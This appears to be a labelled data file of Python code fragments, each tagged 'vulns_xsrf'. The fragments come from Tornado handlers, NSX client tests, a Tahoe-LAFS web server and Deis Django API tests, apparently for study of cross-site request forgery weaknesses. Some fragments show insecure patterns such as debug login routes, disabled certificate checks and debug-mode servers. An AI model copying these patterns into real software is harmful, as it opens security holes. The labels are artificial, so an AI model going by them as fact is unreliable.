"        js_mode = 'compiled'        if config.debug and config.is_dev_appserver:            js_mode = self.request.get('js_mode', 'raw')            'js_mode': js_mode,            'xsrf_token': self.session['xsrf_token'],",vulns_xsrf
"            ev.response.set_cookie(COOKIE_NAME, token)",vulns_xsrf
"            return self.redirect(""/"")",vulns_xsrf
        self.check_xsrf(),vulns_xsrf
"            error = ""xsrf invalid""            self.get(error)",vulns_xsrf
        self.check_xsrf(),vulns_xsrf
"            return self.redirect(""ftypeerror"")",vulns_xsrf
        self.check_xsrf() ,vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
    self.fail('Unknown request %s' % url),vulns_xsrf
        if not c.user and not model.OpenID.by_id(openid):,vulns_xsrf
                    if request.method != 'GET':            if request.method == 'GET' and has_token():,vulns_xsrf
            return q.one(),vulns_xsrf
        if not c.user and not model.OpenID.by_id(openid):,vulns_xsrf
                    if request.method != 'GET':            if request.method == 'GET' and has_token():,vulns_xsrf
            return q.one(),vulns_xsrf
"from tornado.escape import json_encode, to_unicode    catch_bare_integrity_error, validation_message, BaseHandler",vulns_xsrf
class SubmitAPIHandler(BaseHandler):,vulns_xsrf
"from tornado.escape import json_encodefrom pages.util.base import APIHandler, get_email",vulns_xsrf
"                              method='POST', body=json_encode(input_data))",vulns_xsrf
"from pages.api.surveys import SurveysAPIHandler, SingleSurveyAPIHandlerfrom pages.debug import DebugLoginHandler, DebugLogoutHandler",vulns_xsrf
"    pages += [(r'/debug/login/(.+)/?', DebugLoginHandler),",vulns_xsrf
            self._check_xsrf_cookie(),vulns_xsrf
  return,vulns_xsrf
"      return responses.startTask(request.path, context=context)",vulns_xsrf
  return,vulns_xsrf
"      return responses.startTask(request.path, context=context)",vulns_xsrf
"app.register_blueprint(topic_routes, url_prefix=""/topic"")app.register_blueprint(auth_routes, url_prefix=""/auth"")app.register_blueprint(reply_routes, url_prefix=""/reply"")	app.run(debug=True)",vulns_xsrf
"            ""template_path"": ""templates/""",vulns_xsrf
"        email       = self.get_argument(""email"", default='', strip=False)        user = self.current_user        if user.email != email:            return",vulns_xsrf
        return json_data,vulns_xsrf
"        return NsxClientTestCase.MockNSXClusteredAPI(            session_response=session_response, **kwargs)",vulns_xsrf
"                         headers=nsx_client.JSONRESTClient._DEFAULT_HEADERS,",vulns_xsrf
    'Accept': '*/*',vulns_xsrf
"                     headers=client.JSONRESTClient._DEFAULT_HEADERS,",vulns_xsrf
"        session = provider.new_connection(            mock_api, cluster.Provider('9.8.7.6', 'https://9.8.7.6',                                       'nsxuser', 'nsxpassword', None))        self.assertEqual(('nsxuser', 'nsxpassword'), session.auth)        self.assertFalse(session.verify)        self.assertIsNone(session.cert)        self.assertEqual(100, session.adapters['https://'].max_retries.total)        self.assertEqual(99, session.timeout)",vulns_xsrf
"        session = provider.new_connection(            mock_api, cluster.Provider('9.8.7.6', 'https://9.8.7.6',                                       None, None, None))        self.assertIsNone(session.auth)        self.assertFalse(session.verify)        self.assertEqual(cert_provider_inst, session.cert_provider)        self.assertEqual(99, session.timeout)",vulns_xsrf
        api = self.mock_nsx_clustered_api()        api._reinit_cluster(),vulns_xsrf
"            }, sort_keys=True))",vulns_xsrf
"            }, sort_keys=True))",vulns_xsrf
"            }, sort_keys=True))",vulns_xsrf
"            }, sort_keys=True))",vulns_xsrf
"            }, sort_keys=True))",vulns_xsrf
            data=None),vulns_xsrf
"            data=jsonutils.dumps(resp_body, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(resp_body, sort_keys=True))",vulns_xsrf
            'https://1.2.3.4/api/v1/logical-ports/%s?detach=true' % uuid),vulns_xsrf
"            ""&attachment_id=%s"" % (attachment_type, attachment_id))",vulns_xsrf
"            data=jsonutils.dumps(fake_port, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
            'https://1.2.3.4/api/v1/logical-routers/%s' % uuid),vulns_xsrf
            'https://1.2.3.4/api/v1/logical-routers/%s?force=True' % uuid),vulns_xsrf
"                data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
                test_constants.FAKE_ROUTER_UUID)),vulns_xsrf
"                data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
"                    (test_constants.FAKE_ROUTER_UUID, rule_id)))",vulns_xsrf
"                    (test_constants.FAKE_ROUTER_UUID, rule_id)))",vulns_xsrf
"                data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
            'https://1.2.3.4/api/v1/logical-router-ports/%s' % uuid),vulns_xsrf
"                data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
            'logical_router_id=%s' % router_id),vulns_xsrf
            'logical_switch_id=%s' % switch_id),vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(fake_ip_pool, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(fake_ip_pool, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(fake_ip_pool, sort_keys=True))",vulns_xsrf
            'https://1.2.3.4/api/v1/pools/ip-pools/%s' % uuid),vulns_xsrf
            'https://1.2.3.4/api/v1/pools/ip-pools/%s' % uuid),vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
"            data=jsonutils.dumps(data, sort_keys=True))",vulns_xsrf
            'https://1.2.3.4/api/v1/pools/ip-pools/%s/allocations' % uuid),vulns_xsrf
        if not self._cert_provider:,vulns_xsrf
            url_path_base=cluster_api.nsxlib_config.url_base),vulns_xsrf
            {'99': exceptions.ClientCertificateNotTrusted}},vulns_xsrf
"            if inspect.isclass(self.cert_provider):                return self.cert_provider()            return self.cert_provider        skip_cert = kwargs.pop('skip_cert', False)        if not self._cert_provider or skip_cert:",vulns_xsrf
"        req_data = 'j_username=%s&j_password=%s' % (provider.username,                                                    provider.password)                               data=req_data, headers=req_headers,                               skip_cert=True)",vulns_xsrf
"      package_data={ 'allmydata': ['web/*.xhtml', 'web/*.css'] },",vulns_xsrf
"            ws = WebishServer(webport)            ws.allow_local_access(os.path.exists(os.path.join(self.basedir,                                  self.WEB_ALLOW_LOCAL_ACCESS_FILE)))            self.add_service(ws)",vulns_xsrf
            self.failUnless('To view your personal private non-shared' in res),vulns_xsrf
"        d.addCallback(lambda res:                      self.GET(""/vdrive/private"", followRedirect=True))        def _check4(res):            pass        d.addCallback(_check4)",vulns_xsrf
"from twisted.application import service, strports",vulns_xsrf
"            elif segments[1] == ""private"":                d = vdrive.get_private_root()                name = ""private vdrive""",vulns_xsrf
"        if IClient(ctx).getServiceNamed(""vdrive"").have_private_root():                       T.a(href=""vdrive/private"")[""Click Here!""],",vulns_xsrf
"    def __init__(self, webport, local_access=False):",vulns_xsrf
"      package_data={ 'allmydata': ['web/*.xhtml', 'web/*.css'] },",vulns_xsrf
"            ws = WebishServer(webport)            ws.allow_local_access(os.path.exists(os.path.join(self.basedir,                                  self.WEB_ALLOW_LOCAL_ACCESS_FILE)))            self.add_service(ws)",vulns_xsrf
            self.failUnless('To view your personal private non-shared' in res),vulns_xsrf
"        d.addCallback(lambda res:                      self.GET(""/vdrive/private"", followRedirect=True))        def _check4(res):            pass        d.addCallback(_check4)",vulns_xsrf
"from twisted.application import service, strports",vulns_xsrf
"            elif segments[1] == ""private"":                d = vdrive.get_private_root()                name = ""private vdrive""",vulns_xsrf
"        if IClient(ctx).getServiceNamed(""vdrive"").have_private_root():                       T.a(href=""vdrive/private"")[""Click Here!""],",vulns_xsrf
"    def __init__(self, webport, local_access=False):",vulns_xsrf
from cookielib import MozillaCookieJar,vulns_xsrf
"        cookie_file = os.path.expanduser('~/.deis/cookies.txt')        cookie_dir = os.path.dirname(cookie_file)        self.cookies = MozillaCookieJar(cookie_file)        if not os.path.isdir(cookie_dir):            os.mkdir(cookie_dir, 0700)        if os.path.isfile(cookie_file):            self.cookies.load()            self.cookies.clear_expired_cookies()            self.cookies.save()",vulns_xsrf
        Issue an HTTP request with proper cookie handling,vulns_xsrf
"        self.cookies.save()        os.chmod(self.cookies.filename, 0600)",vulns_xsrf
"        headers = {            'content-type': 'application/json',            'X-Deis-Version': __version__.rsplit('.', 1)[0],        }        if not controller:                'No active controller. Use `deis login` or `deis register` to get started.')",vulns_xsrf
        self._session.cookies.clear()        self._session.cookies.save(),vulns_xsrf
                self._session.cookies.clear()                self._session.cookies.save(),vulns_xsrf
"        self._session.cookies.clear()        self._session.cookies.save()        self._session.get(url, headers=headers)        if response.status_code == requests.codes.found:  # @UndefinedVariable",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"            HTTP_X_DEIS_VERSION=__version__.rsplit('.', 1)[0]",vulns_xsrf
            HTTP_X_DEIS_VERSION='1234.5678',vulns_xsrf
        response = self.client.get('/api/apps'),vulns_xsrf
from django.test import TestCase,vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get('/api/apps')        response = self.client.get(url)        response = self.client.patch(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)                                    content_type='application/json')                                    content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)            response = self.client.get(url)        response = self.client.post(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        url = '/api/auth/login/'        body = {'username': 'fail', 'password': 'this'}        response = self.client.post(url, data=json.dumps(body), content_type='application/json')        self.assertEqual(response.status_code, 200)",vulns_xsrf
"        self.assertTrue(            self.client.login(username=username, password=password))        url = '/api/auth/logout/'        response = self.client.post(url, content_type='application/json')        self.assertEqual(response.status_code, 200)        self.assertEqual(response.status_code, 302)",vulns_xsrf
"        self.assertTrue(            self.client.login(username=username, password=password))        response = self.client.delete(url)        self.assertFalse(            self.client.login(username=username, password=passwo",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url, content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.post(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
from django.test import TransactionTestCase,vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.post(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
        response = self.client.post(url)        response = self.client.get(url),vulns_xsrf
"        self.assertIsNone(self.client.logout())        self.assertEqual(response.status_code, 403)",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.delete(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='firstuser', password='password'))        response = self.client.get('/api/admin/perms', content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='seconduser', password='password'))        response = self.client.get('/api/admin/perms', content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='first', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='first', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url + '/second')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')            response = self.client.get(""/api/apps/{}/{}/"".format(app_id, model))        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')            response = self.client.get(""/api/apps/{}/{}/"".format(app_id, model))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.get('/api/apps')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')        response = self.client.delete(url, content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.delete(url, content_type='application/json')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-1', password='password'))        response = self.client.delete(url, content_type='application/json')        response = self.client.get('/api/apps')        response = self.client.post(url, json.dumps(body), content_type='application/json')            ""/api/apps/{}/perms"".format(app_id), content_type='application/json')        response = self.client.get('/api/apps')        response = self.client.get('/api/apps')        self.assertTrue(            self.client.login(username='autotest-2', password='password'))            ""/api/apps/{}/perms"".format(app_id), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        self.assertEqual(self.client.post(url).status_code, 405)        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)        response = self.client.post(url)        response = self.client.post(url, content_type='application/json')            url, json.dumps(body), content_type='application/json')            url, json.dumps(body), content_type='application/json')        response = self.client.post(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url, content_type='application/json')",vulns_xsrf
"            url, json.dumps(body), content_type='application/json')        response = self.client.get(url, content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.get(url)            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')            url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"            response = self.client.post(url, json.dumps(body), content_type='application/json')            response = self.client.get(url)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.get(url)        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
.. http:post:: /api/auth/login  Authenticate for the REST framework... http:post:: /api/auth/logout  Clear authentication for the REST framework... http:get:: /api/generate-api-key/,vulns_xsrf
"    url(r'^auth/',        include('rest_framework.urls', namespace='rest_framework')),    url(r'^generate-api-key/',",vulns_xsrf
"        'rest_framework.authentication.SessionAuthentication',",vulns_xsrf
from cookielib import MozillaCookieJar,vulns_xsrf
"        cookie_file = os.path.expanduser('~/.deis/cookies.txt')        cookie_dir = os.path.dirname(cookie_file)        self.cookies = MozillaCookieJar(cookie_file)        if not os.path.isdir(cookie_dir):            os.mkdir(cookie_dir, 0700)        if os.path.isfile(cookie_file):            self.cookies.load()            self.cookies.clear_expired_cookies()            self.cookies.save()",vulns_xsrf
        Issue an HTTP request with proper cookie handling,vulns_xsrf
"        self.cookies.save()        os.chmod(self.cookies.filename, 0600)",vulns_xsrf
"        headers = {            'content-type': 'application/json',            'X-Deis-Version': __version__.rsplit('.', 1)[0],        }        if not controller:                'No active controller. Use `deis login` or `deis register` to get started.')",vulns_xsrf
        self._session.cookies.clear()        self._session.cookies.save(),vulns_xsrf
                self._session.cookies.clear()                self._session.cookies.save(),vulns_xsrf
"        self._session.cookies.clear()        self._session.cookies.save()        self._session.get(url, headers=headers)        if response.status_code == requests.codes.found:  # @UndefinedVariable",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"            HTTP_X_DEIS_VERSION=__version__.rsplit('.', 1)[0]",vulns_xsrf
            HTTP_X_DEIS_VERSION='1234.5678',vulns_xsrf
        response = self.client.get('/api/apps'),vulns_xsrf
from django.test import TestCase,vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get('/api/apps')        response = self.client.get(url)        response = self.client.patch(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)                                    content_type='application/json')                                    content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)            response = self.client.get(url)        response = self.client.post(url)",vulns_xsrf
        response = self.client.get(url),vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.delete(url)",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest2', password='password'))        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertTrue(            self.client.login(username='autotest', password='password'))        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        url = '/api/auth/login/'        body = {'username': 'fail', 'password': 'this'}        response = self.client.post(url, data=json.dumps(body), content_type='application/json')        self.assertEqual(response.status_code, 200)",vulns_xsrf
"        self.assertTrue(            self.client.login(username=username, password=password))        url = '/api/auth/logout/'        response = self.client.post(url, content_type='application/json')        self.assertEqual(response.status_code, 200)        self.assertEqual(response.status_code, 302)",vulns_xsrf
"        self.assertTrue(            self.client.login(username=username, password=password))        response = self.client.delete(url)        self.assertFalse(            self.client.login(username=username, password=passwo",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)        response = self.client.post(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
        response = self.client.post(url),vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.client.login(username='autotest2', password='password')        response = self.client.post(url)        self.client.login(username='autotest', password='password')        response = self.client.post(url, json.dumps(body), content_type='application/json')",vulns_xsrf
"        self.assertTrue(            self.client.login(username='autotest', password='password'))",vulns_xsrf
"        response = self.client.post(url)        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.get(url)",vulns_xsrf
"        response = self.client.post(url, json.dumps(body), content_type='application/json')        response = self.client.post(url, json.dumps(body), content_type='application/json')        self.assertEqual(self.client.put(url).status_code, 405)        self.assertEqual(self.client.patch(url).status_code, 405)        self.assertEqual(self.client.delete(url).status_code, 405)",vulns_xsrf
